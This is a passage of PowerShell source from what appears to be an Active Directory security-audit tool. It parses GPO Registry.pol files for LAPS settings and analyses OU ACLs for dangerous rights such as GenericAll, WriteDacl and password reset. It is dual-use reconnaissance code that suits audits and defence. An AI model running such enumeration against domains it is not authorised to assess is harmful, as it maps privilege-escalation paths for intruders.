    Registry.pol is the binary format used by Group Policy Administrative Templates to store
    registry values (as opposed to Group Policy Preferences, which use Registry.xml). This is
    a byte-offset binary parser - not a text/regex search - so it correctly handles binary
    Type/Size fields regardless of what byte values they happen to contain.

    Format: "PReg" + version(4) + records of [key;value;type;size;data]
    Strings are null-terminated UTF-16LE; separators ';' '[' ']' are UTF-16LE literals.
    Ref: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/registry-policy-file-format

.PARAMETER PolFilePath
    Full path to the Registry.pol file.

.PARAMETER Hive
    Hive label to stamp on each returned record (e.g. 'Machine' or 'User') - purely
    informational, based on which SYSVOL subfolder the file was read from.

.OUTPUTS
    Array of PSCustomObject: Hive, Key, ValueName, Type, ValueInt, ValueString

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
function Parse-PRegRecords {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$PolFilePath,

        [Parameter(Mandatory=$true)]
        [string]$Hive
    )

    $records = @()

    try {
        $bytes = [System.IO.File]::ReadAllBytes($PolFilePath)
        if ($bytes.Length -lt 8) { return $records }
        if ([System.Text.Encoding]::ASCII.GetString($bytes, 0, 4) -ne 'PReg') {
            Write-Log "[Parse-PRegRecords] Invalid PReg header: $PolFilePath"
            return $records
        }

        $pos = 8  # skip signature(4) + version(4)
        $len = $bytes.Length

        # Local reader for null-terminated UTF-16LE strings; advances $pos past terminator
        $readString = {
            param([ref]$p)
            $start = $p.Value
            while (($p.Value + 1) -lt $len) {
                if ($bytes[$p.Value] -eq 0 -and $bytes[$p.Value + 1] -eq 0) { break }
                $p.Value += 2
            }
            $strLen = $p.Value - $start
            $s = ''
            if ($strLen -gt 0) { $s = [System.Text.Encoding]::Unicode.GetString($bytes, $start, $strLen) }
            $p.Value += 2  # consume null terminator
            return $s
        }

        $openBracket = 0x5B   # [
        $semicolon   = 0x3B   # ;

        while ($pos -lt $len) {
            # Find next '[' (0x5B 0x00)
            if (-not ($bytes[$pos] -eq $openBracket -and ($pos + 1) -lt $len -and $bytes[$pos + 1] -eq 0)) {
                $pos += 2
                continue
            }
            $pos += 2

            $ref = [ref]$pos
            $key = (& $readString $ref)
            # expect ';'
            if (-not ($pos -lt $len -and $bytes[$pos] -eq $semicolon)) { break }
            $pos += 2

            $valueName = (& $readString $ref)
            if (-not ($pos -lt $len -and $bytes[$pos] -eq $semicolon)) { break }
            $pos += 2

            if (($pos + 4) -gt $len) { break }
            $type = [System.BitConverter]::ToUInt32($bytes, $pos)
            $pos += 4
            if (-not ($pos -lt $len -and $bytes[$pos] -eq $semicolon)) { break }
            $pos += 2

            if (($pos + 4) -gt $len) { break }
            $size = [System.BitConverter]::ToUInt32($bytes, $pos)
            $pos += 4
            if (-not ($pos -lt $len -and $bytes[$pos] -eq $semicolon)) { break }
            $pos += 2

            if (($pos + $size) -gt $len) { break }
            $data = New-Object byte[] $size
            if ($size -gt 0) { [System.Array]::Copy($bytes, $pos, $data, 0, $size) }
            $pos += $size

            # Decode value depending on registry type
            $valueInt = $null
            $valueString = $null
            switch ($type) {
                4  { if ($data.Length -ge 4) { $valueInt = [System.BitConverter]::ToUInt32($data, 0) } }      # REG_DWORD
                5  { if ($data.Length -ge 4) { $valueInt = [System.BitConverter]::ToUInt32($data, 0) } }      # REG_DWORD_BIG_ENDIAN (rare)
                11 { if ($data.Length -ge 8) { $valueInt = [System.BitConverter]::ToUInt64($data, 0) } }      # REG_QWORD
                1  { $valueString = [System.Text.Encoding]::Unicode.GetString($data).TrimEnd([char]0) }       # REG_SZ
                2  { $valueString = [System.Text.Encoding]::Unicode.GetString($data).TrimEnd([char]0) }       # REG_EXPAND_SZ
                7  { $valueString = ([System.Text.Encoding]::Unicode.GetString($data).TrimEnd([char]0)) }     # REG_MULTI_SZ
            }

            $records += [PSCustomObject]@{
                Hive        = $Hive
                Key         = $key
                ValueName   = $valueName
                Type        = $type
                ValueInt    = $valueInt
                ValueString = $valueString
            }

            # expect ']' - if not present, the loop's resync will find the next '['
        }
    } catch {
        Write-Log "[Parse-PRegRecords] Error parsing $PolFilePath : $_"
    }

    return $records
}



# ----- Get-LAPSGPOConfig.ps1 -----

<#
.SYNOPSIS
    Extracts LAPS policy metadata (account name, password policy, backup/encryption settings)
    from Group Policy Objects.

.DESCRIPTION
    Parses GPO Registry.pol files to find LAPS settings, for both LAPS generations:
    - Legacy LAPS:    Software\Policies\Microsoft Services\AdmPwd
    - Windows LAPS:   Software\Microsoft\Windows\CurrentVersion\Policies\LAPS

    These GPO settings are readable independently of LAPS password read permissions - they
    disclose the managed account name and password policy even when the password itself is
    not accessible to the current user, and can reveal misconfigurations (e.g. encryption
    disabled, backup target disabled) before ever enumerating a single computer object.

.PARAMETER DomainController
    Domain Controller to query. Uses current domain if not specified.

.EXAMPLE
    Get-LAPSGPOConfig
    Returns: @{
        Legacy = @{ "Default Domain Policy" = @{ AdminAccountName = "Administrator"; PasswordLength = 14 } }
        Native = @{ "LAPS Custom" = @{ AdministratorAccountName = "LocalAdmin"; ADPasswordEncryptionEnabled = 1 } }
    }

.OUTPUTS
    Hashtable with two keys, 'Legacy' and 'Native', each a hashtable of GPO Name -> metadata
    hashtable (only the fields actually configured in that GPO are present).

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function Get-LAPSGPOConfig {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$DomainController
    )

    begin {
        Write-Log "[Get-LAPSGPOConfig] Starting LAPS GPO analysis"
    }

    process {
        # Internal helper - caller must ensure LDAP connection exists
        # UNIFIED: Check for LdapConnection (works for both LDAP and LDAPS)
        if (-not $Script:LdapConnection) {
            Show-NoSessionError -Context "Get-LAPSGPOConfig"
            Write-Log "[Get-LAPSGPOConfig] No LDAP connection - returning null"
            return $null
        }

        try {

            # Get all GPOs to build GUID-to-Name mapping
            Write-Log "[Get-LAPSGPOConfig] Querying GPOs for LAPS settings"

            $GPOFilter = "(objectClass=groupPolicyContainer)"
            $GPOs = Invoke-LDAPSearch -Filter $GPOFilter -Properties @("displayName", "cn")

            $LAPSGPOSettings = @{ Legacy = @{}; Native = @{} }

            if (-not $GPOs -or $GPOs.Count -eq 0) {
                Write-Log "[Get-LAPSGPOConfig] No GPOs found"
                return $LAPSGPOSettings
            }

            # Build GPO GUID-to-Name mapping
            $gpoGuidToName = @{}
            foreach ($GPO in $GPOs) {
                if ($GPO.cn) {
                    $gpoGuidToName[$GPO.cn.ToUpper()] = $GPO.displayName
                }
            }

            Write-Log "[Get-LAPSGPOConfig] Built mapping for $($gpoGuidToName.Count) GPOs"

            $Script:lapsGPOResults = @{ Legacy = @{}; Native = @{} }

            # Uses the shared SYSVOL file cache (Get-CachedSYSVOLFiles, in Invoke-SMBAccess.ps1)
            # instead of a self-built path from gPCFileSysPath. That attribute stores the domain
            # DFS namespace path (\\domain\SYSVOL\...), which is a DIFFERENT SMB target than the
            # DC hostname (\\dc01.domain\SYSVOL\...) Invoke-SMBAccess actually authenticates
            # against - a client that can reach one may not be able to reach the other, and the
            # mismatch fails silently (empty result, no error). Get-CachedSYSVOLFiles also shares
            # its single SYSVOL walk with Get-GPORegistrySettings instead of scanning it twice.
            Invoke-SMBAccess -Description "Scanning GPO Registry.pol for LAPS settings" -ScriptBlock {
                try {
                    $polFiles = @(Get-CachedSYSVOLFiles -Filter "Registry.pol")

                    if ($polFiles.Count -eq 0) {
                        Write-Log "[Get-LAPSGPOConfig] No Registry.pol files found in SYSVOL"
                        return
                    }

                    Write-Log "[Get-LAPSGPOConfig] Found $($polFiles.Count) Registry.pol files"

                    foreach ($polFile in $polFiles) {
                        # Extract GPO GUID from path: \Policies\{GUID}\Machine\Registry.pol
                        if ($polFile.FullName -match '\\Policies\\(\{[^}]+\})\\') {
                            $gpoGuid = $Matches[1].ToUpper()
                            $gpoName = $gpoGuidToName[$gpoGuid]

                            if (-not $gpoName) {
                                Write-Log "[Get-LAPSGPOConfig] Unknown GPO GUID: $gpoGuid, skipping"
                                continue
                            }

                            Write-Log "[Get-LAPSGPOConfig] Checking GPO '$gpoName' at: $($polFile.FullName)"

                            try {
                                $Metadata = Get-LAPSMetadataFromPol -PolFilePath $polFile.FullName

                                # Carry the GUID so callers can resolve GPO links (Get-GPOLinkage)
                                if ($Metadata.Legacy) {
                                    $Metadata.Legacy['GPOGUID'] = $gpoGuid
                                    $Script:lapsGPOResults.Legacy[$gpoName] = $Metadata.Legacy
                                    Write-Log "[Get-LAPSGPOConfig] Found Legacy LAPS settings in GPO '$gpoName': $($Metadata.Legacy.Keys -join ', ')"
                                }
                                if ($Metadata.Native) {
                                    $Metadata.Native['GPOGUID'] = $gpoGuid
                                    $Script:lapsGPOResults.Native[$gpoName] = $Metadata.Native
                                    Write-Log "[Get-LAPSGPOConfig] Found Windows LAPS settings in GPO '$gpoName': $($Metadata.Native.Keys -join ', ')"
                                }
                            } catch {
                                Write-Log "[Get-LAPSGPOConfig] Failed to parse Registry.pol for GPO '$gpoName': $_"
                            }
                        }
                    }
                } catch {
                    Write-Log "[Get-LAPSGPOConfig] Error during recursive search: $_"
                }
            }

            $LAPSGPOSettings = $Script:lapsGPOResults

            Write-Log "[Get-LAPSGPOConfig] Found LAPS settings in $($LAPSGPOSettings.Legacy.Count) Legacy and $($LAPSGPOSettings.Native.Count) Native GPO(s)"
            return $LAPSGPOSettings

        } catch {
            Write-Log "[Get-LAPSGPOConfig] Error: $_"
            return @{ Legacy = @{}; Native = @{} }
        }
    }

    end {
        Write-Log "[Get-LAPSGPOConfig] LAPS GPO analysis completed"
    }
}

# Legacy LAPS fields tracked from Software\Policies\Microsoft Services\AdmPwd
$Script:LAPSLegacyMetadataFields = @('AdminAccountName', 'PasswordComplexity', 'PasswordLength', 'PasswordAgeDays')

# Windows LAPS fields tracked from Software\Microsoft\Windows\CurrentVersion\Policies\LAPS
# Reference: https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-policy-settings
$Script:LAPSNativeMetadataFields = @(
    'AdministratorAccountName', 'PasswordComplexity', 'PasswordLength', 'PassphraseLength',
    'PasswordAgeDays', 'BackupDirectory', 'ADPasswordEncryptionEnabled',
    'ADPasswordEncryptionPrincipal', 'PasswordExpirationProtectionEnabled'
)

<#
.SYNOPSIS
    Extracts LAPS metadata (account name, password policy, backup/encryption settings) from a
    single Registry.pol file.

.DESCRIPTION
    Uses the shared binary PReg parser (Parse-PRegRecords, in Parse-RegistryPol.ps1) instead
    of text/regex searching - Registry.pol is a binary format where the Type/Size DWORD
    fields can contain arbitrary byte values, including embedded nulls that break a naive
    "search for the next null terminator" approach.

    Only fields explicitly set in this GPO are included - a field being absent means it falls
    back to the Windows LAPS default for that setting, not that it was set to zero/empty.
    Conversely, a present field can legitimately be 0 (e.g. ADPasswordEncryptionEnabled=0,
    BackupDirectory=0/Disabled) - both are security-relevant and must not be treated as "unset".

.PARAMETER PolFilePath
    Full path to Registry.pol file

.OUTPUTS
    Hashtable @{ Legacy = <hashtable|null>; Native = <hashtable|null> }
    Legacy/Native are $null when this GPO has no settings for that LAPS generation, otherwise
    a hashtable of FieldName -> value (string or int, whichever the registry type produced).

.NOTES
    Internal helper function
#>
function Get-LAPSMetadataFromPol {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$PolFilePath
    )

    $result = @{ Legacy = $null; Native = $null }

    try {
        $records = Parse-PRegRecords -PolFilePath $PolFilePath -Hive 'Machine'

        $legacyData = @{}
        $nativeData = @{}

        foreach ($record in $records) {
            # DWORD values land in ValueInt, REG_SZ/REG_EXPAND_SZ in ValueString - never
            # collapse 0/empty-string via truthiness, both are meaningful configured values
            $value = $null
            if ($null -ne $record.ValueString) { $value = $record.ValueString }
            elseif ($null -ne $record.ValueInt) { $value = $record.ValueInt }
            if ($null -eq $value) { continue }

            if ($record.Key -ieq 'Software\Policies\Microsoft Services\AdmPwd' -and $record.ValueName -in $Script:LAPSLegacyMetadataFields) {
                $legacyData[$record.ValueName] = $value
            }
            elseif ($record.Key -ieq 'Software\Microsoft\Windows\CurrentVersion\Policies\LAPS' -and $record.ValueName -in $Script:LAPSNativeMetadataFields) {
                $nativeData[$record.ValueName] = $value
            }
        }

        if ($legacyData.Count -gt 0) { $result.Legacy = $legacyData }
        if ($nativeData.Count -gt 0) { $result.Native = $nativeData }

        if (-not $result.Legacy -and -not $result.Native) {
            Write-Log "[Get-LAPSMetadataFromPol] No LAPS setting found in Registry.pol"
        }

        return $result

    } catch {
        Write-Log "[Get-LAPSMetadataFromPol] Error parsing Registry.pol: $_"
        return $result
    }
}



# ----- Get-OUPermissions.ps1 -----

<#
.SYNOPSIS
    Helper function to determine the source of an inherited ACE.

.DESCRIPTION
    Traces the parent container chain to find where an inherited ACE was originally set.
    Loads parent ACLs via Invoke-LDAPSearch (reuses existing LdapConnection).
    Returns the distinguished name of the source container (e.g., domain root).

.PARAMETER DistinguishedName
    The DN of the object with the inherited ACE.

.PARAMETER ACE
    The ACE to trace.

.OUTPUTS
    String: Distinguished name of the inheritance source, or "Inherited" if source cannot be determined.
#>
function Get-ACEInheritanceSource {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$DistinguishedName,

        [Parameter(Mandatory=$true)]
        $ACE
    )

    try {
        # Get domain DN from context
        $domainDN = $Script:LDAPContext.DomainDN

        # Parse the DN to get parent containers
        # Example: OU=Computers,OU=Corp,DC=contoso,DC=com
        # Parents: OU=Corp,DC=contoso,DC=com -> DC=contoso,DC=com

        $currentDN = $DistinguishedName
        $parents = @()

        # Build list of parent DNs
        while ($currentDN -match '^[^,]+,(.+)$') {
            $parentDN = $Matches[1]
            $parents += $parentDN
            $currentDN = $parentDN

            # Stop at domain root
            if ($parentDN -eq $domainDN) {
                break
            }
        }

        # ACE.IdentityReference is always a SecurityIdentifier (from GetAccessRules with [SecurityIdentifier])
        $aceIdentitySID = $ACE.IdentityReference.Value

        # Session-level cache for parent ACLs (parent ACLs are identical across all child OUs)
        if (-not $Script:InheritanceACLCache) {
            $Script:InheritanceACLCache = @{}
        }

        # Check each parent starting from immediate parent
        foreach ($parentDN in $parents) {
            try {
                # Load parent ACL - use cache to avoid redundant LDAP queries
                # Parent ACLs are shared by all child OUs, so caching is highly effective
                $cacheKey = $parentDN.ToLowerInvariant()
                $parentAccessRules = $null

                if ($Script:InheritanceACLCache.ContainsKey($cacheKey)) {
                    $parentAccessRules = $Script:InheritanceACLCache[$cacheKey]
                } else {
                    $parentResult = @(Invoke-LDAPSearch -Filter "(objectClass=*)" -SearchBase $parentDN -Scope Base -Properties 'nTSecurityDescriptor' -Raw)[0]
                    if ($parentResult -and $parentResult.nTSecurityDescriptor) {
                        $parentSdParsed = ConvertTo-AccessRules -SecurityDescriptorBytes $parentResult.nTSecurityDescriptor
                        $parentAccessRules = if ($parentSdParsed) { $parentSdParsed.AccessRules } else { @() }
                    } else {
                        $parentAccessRules = @()
                    }
                    $Script:InheritanceACLCache[$cacheKey] = $parentAccessRules
                }

                if (-not $parentAccessRules -or @($parentAccessRules).Count -eq 0) {
                    continue
                }

                # Look for matching explicit ACE on parent
                # We use relaxed matching: same identity + explicit + similar rights
                foreach ($parentACE in $parentAccessRules) {
                    # Must be explicit (not inherited) and Allow
                    if ($parentACE.IsInherited) { continue }
                    if ($parentACE.AccessControlType -ne [System.Security.AccessControl.AccessControlType]::Allow) { continue }

                    # Match by SID (both are SecurityIdentifier - direct string comparison)
                    if ($parentACE.IdentityReference.Value -ne $aceIdentitySID) { continue }

                    # Relaxed matching: Check if the parent ACE could be the source
                    # The inherited ACE may have different rights due to inheritance flags
                    # Key indicators: same identity + explicit + inheritable

                    # Check inheritance flags - must be set to inherit to children
                    $inheritFlags = $parentACE.InheritanceFlags
                    $canInherit = ($inheritFlags -band [System.Security.AccessControl.InheritanceFlags]::ContainerInherit) -or
                                  ($inheritFlags -band [System.Security.AccessControl.InheritanceFlags]::ObjectInherit)

                    if (-not $canInherit) { continue }

                    # Additional check: ObjectType should match (the right being granted)
                    # Skip this check if either ObjectType is Empty GUID (means "all properties/rights")
                    # GUID::Empty is truthy in PowerShell, so we must check explicitly
                    $aceObjType = $ACE.ObjectType
                    $parentObjType = $parentACE.ObjectType
                    if ($aceObjType -and $aceObjType -ne [GUID]::Empty -and
                        $parentObjType -and $parentObjType -ne [GUID]::Empty) {
                        if ($aceObjType -ne $parentObjType) { continue }
                    }

                    # Found the source - return a friendly name
                    if ($parentDN -eq $domainDN) {
                        return "Domain Root ($domainDN)"
                    } else {
                        # Extract the first RDN for display (e.g., "OU=Corp" -> "Corp")
                        $rdnMatch = $parentDN -match '^([^=]+)=([^,]+)'
                        if ($rdnMatch) {
                            $rdnType = $Matches[1]
                            $rdnValue = $Matches[2]
                            return "$rdnType=$rdnValue ($parentDN)"
                        }
                        return $parentDN
                    }
                }

            } catch {
                Write-Log "[Get-ACEInheritanceSource] Error checking parent '$parentDN': $_"
                continue
            }
        }

        # Couldn't determine exact source - but if the ACE is inherited,
        # it MUST come from somewhere in the parent chain
        # Default to domain root as the most common source for domain-wide delegations
        if ($parents -contains $domainDN) {
            return "Domain Root ($domainDN)"
        }

        return "Inherited"

    } catch {
        Write-Log "[Get-ACEInheritanceSource] Error: $_"
        return "Inherited"
    }
}

<#
.SYNOPSIS
    Analyzes ACLs on Organizational Units to identify critical permissions.

.DESCRIPTION
    Universal ACL analysis module that checks for various dangerous permissions on OUs:
    - GenericAll (Full Control)
    - Password Reset Rights
    - Account Control Modification (userAccountControl, SPN, scriptPath)
    - Group Membership Control
    - Delegation Rights (Constrained, RBCD)
    - LAPS Password Access
    - Object Creation/Deletion Rights
    - GPO Linking Rights

    Returns principals (users/groups) who have these permissions.

.PARAMETER DistinguishedName
    The distinguished name of the OU to analyze.

.PARAMETER CheckType
    Type of permission check to perform. Valid values:
    - All (default): All checks
    - GenericAll: Full Control rights
    - PasswordReset: Password reset extended rights
    - AccountControl: userAccountControl write access
    - GroupMembership: member attribute write access
    - SPNModification: servicePrincipalName write access
    - ScriptPath: scriptPath write access
    - Delegation: Delegation attribute write access
    - LAPS: LAPS password read access
    - ObjectCreation: CreateChild rights
    - GPOLinking: gPLink write access

.PARAMETER ExcludeInherited
    Only analyze explicit ACEs (exclude inherited permissions).

.EXAMPLE
    Get-OUPermissions -DistinguishedName "OU=Workstations,DC=contoso,DC=com"
    Performs all checks on the specified OU.

.EXAMPLE
    Get-OUPermissions -DistinguishedName "OU=Users,DC=contoso,DC=com" -CheckType 'PasswordReset'
    Checks only for password reset rights.

.EXAMPLE
    Get-OUPermissions -DistinguishedName "OU=Servers,DC=contoso,DC=com" -CheckType 'LAPS' -ExcludeInherited
    Checks for LAPS read rights, excluding inherited permissions.

.OUTPUTS
    PSCustomObject with:
    - OU: Distinguished name
    - Findings: Array of permission findings with CheckType, Right, Principals, Severity

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function Get-OUPermissions {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$DistinguishedName,

        [Parameter(Mandatory=$false)]
        [ValidateSet(
            'All',
            'GenericAll',
            'GenericWrite',
            'WriteDacl',
            'WriteOwner',
            'PasswordReset',
            'AccountControl',
            'GroupMembership',
            'SPNModification',
            'DNSHostName',
            'ScriptPath',
            'Delegation',
            'LAPS',
            'ObjectCreation',
            'GPOLinking'
        )]
        [string[]]$CheckType = @('All'),

        [Parameter(Mandatory=$false)]
        [switch]$ExcludeInherited
    )

    begin {
        Write-Log "[Get-OUPermissions] Analyzing ACL for OU: $DistinguishedName"

        # Use central GUID definitions from adPEAS-GUIDs.ps1
        # $Script:PropertyGUIDs - Property GUIDs (Name -> GUID)
        # Get-ExtendedRightGUID - Extended Right lookup (Name -> GUID)

        # Use central PropertyGUIDs directly (already Name -> GUID format)
        $PropertyGUIDs = $Script:PropertyGUIDs

        # Schema Class GUIDs for InheritedObjectType checks
        $SchemaClassGUIDs = $Script:SchemaClassGUIDs

        # Track if this is a full scan (All check types) for cross-module caching
        $isFullScan = $CheckType -contains 'All'

        # Expand 'All' to all check types
        if ($isFullScan) {
            $CheckType = @(
                'GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner',
                'PasswordReset', 'AccountControl', 'GroupMembership',
                'SPNModification', 'DNSHostName', 'ScriptPath', 'Delegation', 'LAPS',
                'ObjectCreation', 'GPOLinking'
            )
        }
    }

    process {
        # Internal helper - caller must ensure LDAP connection exists
        if (-not $Script:LdapConnection -or -not $Script:LDAPContext) {
            Write-Log "[Get-OUPermissions] No LDAP connection - returning null"
            return $null
        }

        try {
            # Cross-module result cache: Get-DangerousOUPermissions runs first with -CheckType All,
            # then Get-LAPSPermissions and Get-PasswordResetRights can reuse cached results
            if (-not $Script:OUPermissionsCache) {
                $Script:OUPermissionsCache = @{}
            }

            $cacheKey = $DistinguishedName.ToLowerInvariant()

            if ($Script:OUPermissionsCache.ContainsKey($cacheKey)) {
                $cached = $Script:OUPermissionsCache[$cacheKey]
                # Filter cached full-scan results for requested CheckType
                $filteredFindings = @($cached.Findings | Where-Object { $_.CheckType -in $CheckType })
                Write-Log "[Get-OUPermissions] Cache hit for OU: $DistinguishedName ($(@($filteredFindings).Count) findings for requested types)"
                return [PSCustomObject]@{
                    OU       = $DistinguishedName
                    Findings = $filteredFindings
                }
            }

            Write-Log "[Get-OUPermissions] Analyzing: $DistinguishedName"

            # Load nTSecurityDescriptor via Invoke-LDAPSearch (uses existing $Script:LdapConnection)
            # -Raw returns byte[] instead of ConvertFrom-SecurityDescriptor (we need native ACE objects)
            $ouResult = @(Invoke-LDAPSearch -Filter "(objectClass=*)" -SearchBase $DistinguishedName -Scope Base -Properties 'nTSecurityDescriptor' -Raw)[0]

            if (-not $ouResult -or -not $ouResult.nTSecurityDescriptor) {
                Write-Log "[Get-OUPermissions] Failed to read nTSecurityDescriptor for OU: $DistinguishedName"
                return $null
            }

            # Parse nTSecurityDescriptor into AccessRules via shared helper
            $sdParsed = ConvertTo-AccessRules -SecurityDescriptorBytes $ouResult.nTSecurityDescriptor
            if (-not $sdParsed) {
                Write-Log "[Get-OUPermissions] Failed to parse nTSecurityDescriptor for OU: $DistinguishedName"
                return $null
            }
            $AccessRules = $sdParsed.AccessRules

            $Findings = @()

            # Analyze each ACE
            foreach ($ACE in $AccessRules) {
                # Skip Deny ACEs (we only care about Allow)
                if ($ACE.AccessControlType -ne [System.Security.AccessControl.AccessControlType]::Allow) {
                    continue
                }

                # Skip inherited ACEs if requested
                if ($ExcludeInherited -and $ACE.IsInherited) {
                    continue
                }

                # IdentityReference is always a SecurityIdentifier (guaranteed by GetAccessRules above)
                $TrusteeSID = $ACE.IdentityReference.Value
                $TrusteeName = ConvertFrom-SID -SID $TrusteeSID
                if (-not $TrusteeName) {
                    $TrusteeName = $TrusteeSID
                }

                # Skip ACEs with empty SID (can occur with orphaned/deleted principals)
                if ([string]::IsNullOrEmpty($TrusteeSID)) {
                    Write-Log "[Get-OUPermissions] Skipping ACE with empty SID on OU: $DistinguishedName"
                    continue
                }

                # Use context-specific filtering for OUs
                # SELF and Creator Owner are NORMAL on OUs (self-modification) - skip completely
                # Broad groups (Authenticated Users, Pre-Win2000) have default "All Properties" read - skip only those
                $expectedCheck = Test-IsExpectedACLIdentity -SID $TrusteeSID -Context 'OU'
                if ($expectedCheck.Skip) {
                    # Complete skip - these are expected entries (SELF, Creator Owner)
                    continue
                }
                # Track if this identity should only have "All Properties" findings filtered
                $skipAllPropertiesOnly = $expectedCheck.SkipAllPropertiesOnly

                # Determine severity using central function with recursive group membership check
                # Create an object with SID and name so Test-IsPrivileged can check Exchange groups by name
                # Extract just the name part (remove DOMAIN\ prefix if present)
                $nameOnly = $TrusteeName
                if ($TrusteeName -match '^[^\\]+\\(.+)$') {
                    $nameOnly = $Matches[1]
                }
                $identityObject = [PSCustomObject]@{
                    objectSid = $TrusteeSID
                    sAMAccountName = $nameOnly
                }
                $IsPrivileged = (Test-IsPrivileged -Identity $identityObject).IsPrivileged

                # Track inheritance source
                # Windows ACLs don't provide direct "inherited from" info, but we can determine the source
                # by examining the ACL inheritance chain. For OUs, inherited permissions typically come from:
                # 1. Direct parent OU/container
                # 2. Domain root (most common for domain-wide delegations)
                $InheritedFrom = $null
                if ($ACE.IsInherited) {
                    # Determine the inheritance source by checking the propagation
                    # Inherited ACEs on OUs typically come from the domain root or parent OUs
                    # We'll trace back to find the source
                    $InheritedFrom = Get-ACEInheritanceSource -DistinguishedName $DistinguishedName -ACE $ACE
                }

                # Get ObjectType and InheritedObjectType for scope checking
                # ObjectType = which property/right is affected
                # InheritedObjectType = which object CLASS the ACE applies to (User, Computer, etc.)
                $objectType = $ACE.ObjectType
                $inheritedObjectType = $ACE.InheritedObjectType

                # Pre-calculate common right checks (performance optimization - used by multiple checks)
                $HasWriteProperty = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty
                $IsAllProperties = ($objectType -eq [GUID]::Empty) -or (-not $objectType)

                # InheritedObjectType checks - determines which object class this ACE applies to
                # Empty/null = applies to ALL object types
                # Specific GUID = applies only to that object class
                $IsAllObjectTypes = (-not $inheritedObjectType -or $inheritedObjectType -eq [GUID]::Empty)
                $AppliesToUsers = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['user'])
                $AppliesToComputers = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['computer'])
                $AppliesToGroups = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['group'])

                # If WriteProperty on ALL properties, create ONE generic finding instead of 6+ individual ones
                # This prevents duplicate findings like: userAccountControl, member, SPN, scriptPath, Delegation x2, gPLink
                if ($HasWriteProperty -and $IsAllProperties -and ($CheckType -contains 'AccountControl' -or
                    $CheckType -contains 'GroupMembership' -or $CheckType -contains 'SPNModification' -or
                    $CheckType -contains 'ScriptPath' -or $CheckType -contains 'Delegation' -or
                    $CheckType -contains 'GPOLinking')) {

                    # Skip broad groups with expected "All Properties" access
                    if (-not $skipAllPropertiesOnly) {
                        # Determine scope based on InheritedObjectType
                        $scopeInfo = if ($IsAllObjectTypes) {
                            ""
                        } else {
                            $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
                            if ($targetClass) { " on $targetClass objects" } else { "" }
                        }

                        $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
                        $Findings += [PSCustomObject]@{
                            CheckType     = "WritePropertyAll"
                            Right         = "WriteProperty (All Properties)$scopeInfo"
                            Principal     = $TrusteeName
                            SID           = $TrusteeSID
                            Severity      = $Severity
                            InheritedFrom = $InheritedFrom
                        }
                    }
                }

                # Check 1: GenericAll (Full Control)
                if ($CheckType -contains 'GenericAll') {
                    # GenericAll in AD is 0xF01FF (983551)
                    # We need to check if ALL bits of GenericAll are set, not just some overlap
                    # GenericAll only applies to the whole object if ObjectType is empty
                    $GenericAllValue = [int][System.DirectoryServices.ActiveDirectoryRights]::GenericAll
                    $RightsValue = [int]$ACE.ActiveDirectoryRights

                    $HasFullGenericAll = (($RightsValue -band $GenericAllValue) -eq $GenericAllValue) -and $IsAllProperties
                    if ($HasFullGenericAll) {
                        # Determine scope based on InheritedObjectType
                        $scopeInfo = if ($IsAllObjectTypes) {
                            ""  # No suffix for all objects
                        } else {
                            $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
                            if ($targetClass) { " on $targetClass objects" } else { "" }
                        }

                        $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
                        $Findings += [PSCustomObject]@{
                            CheckType     = "GenericAll"
                            Right         = "GenericAll (Full Control)$scopeInfo"
                            Principal     = $TrusteeName
                            SID           = $TrusteeSID
                            Severity      = $Severity
                            InheritedFrom = $InheritedFrom
                        }
                    }
                }

                # Check 1b: GenericWrite (includes WriteProperty, WriteSelf, WritePropertyExtended)
                # GenericWrite = 0x00020028 - dangerous because it includes WriteProperty on all attributes
                if ($CheckType -contains 'GenericWrite') {
                    $GenericWriteValue = [int][System.DirectoryServices.ActiveDirectoryRights]::GenericWrite
                    $RightsValue = [int]$ACE.ActiveDirectoryRights

                    $HasGenericWrite = (($RightsValue -band $GenericWriteValue) -eq $GenericWriteValue) -and $IsAllProperties
                    if ($HasGenericWrite) {
                        $scopeInfo = if ($IsAllObjectTypes) {
                            ""
                        } else {
                            $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
                            if ($targetClass) { " on $targetClass objects" } else { "" }
                        }

                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                        $Findings += [PSCustomObject]@{
                            CheckType     = "GenericWrite"
                            Right         = "GenericWrite$scopeInfo"
                            Principal     = $TrusteeName
                            SID           = $TrusteeSID
                            Severity      = $Severity
                            InheritedFrom = $InheritedFrom
                        }
                    }
                }

                # Check 1c: WriteDacl (can modify ACL = effectively full control)
                if ($CheckType -contains 'WriteDacl') {
                    $HasWriteDacl = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl

                    if ($HasWriteDacl) {
                        $scopeInfo = if ($IsAllObjectTypes) {
                            ""
                        } else {
                            $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
                            if ($targetClass) { " on $targetClass objects" } else { "" }
                        }

                        $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
                        $Findings += [PSCustomObject]@{
                            CheckType     = "WriteDacl"
                            Right         = "WriteDacl (Modify Permissions)$scopeInfo"
                            Principal     = $TrusteeName
                            SID           = $TrusteeSID
                            Severity      = $Severity
                            InheritedFrom = $InheritedFrom
                        }
                    }
                }

                # Check 1d: WriteOwner (can take ownership = effectively full control)
                if ($CheckType -contains 'WriteOwner') {
